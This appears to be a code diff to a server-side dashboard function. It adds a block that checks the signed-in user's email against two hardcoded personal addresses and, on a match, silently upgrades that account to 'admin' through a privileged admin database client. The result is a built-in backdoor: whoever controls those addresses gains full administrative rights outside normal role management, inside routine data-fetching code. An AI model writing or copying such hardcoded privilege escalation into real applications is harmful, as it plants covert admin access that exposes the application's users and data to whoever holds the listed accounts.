@@ -19,11 +19,34 @@ export async function getDashboardData() {
   }
 
   // 2. Fetch privilege details
-  const { data: profile } = await supabase
+  let { data: profile } = await supabase
     .from("profiles")
     .select("role")
     .eq("id", user.id)
     .single();
+
+  // Auto-provision or auto-upgrade developer emails to 'admin' role
+  const devEmails = ["yura3zaxar@outlook.com", "yura3zaxar@gmail.com"];
+  if (user.email && devEmails.includes(user.email.toLowerCase()) && (!profile || profile.role !== "admin")) {
+    try {
+      const { createAdminClient } = await import("@/utils/supabase/server");
+      const adminSupabase = createAdminClient();
+      await adminSupabase.from("profiles").upsert({
+        id: user.id,
+        email: user.email.toLowerCase(),
+        role: "admin",
+      });
+      // Re-fetch privilege details
+      const { data: updatedProfile } = await supabase
+        .from("profiles")
+        .select("role")
+        .eq("id", user.id)
+        .single();
+      profile = updatedProfile;
+    } catch (e) {
+      console.error("Failed to auto-upgrade user to admin role in actions:", e);
+    }
+  }
 
   if (!profile) {
     throw new Error("Unauthorized");
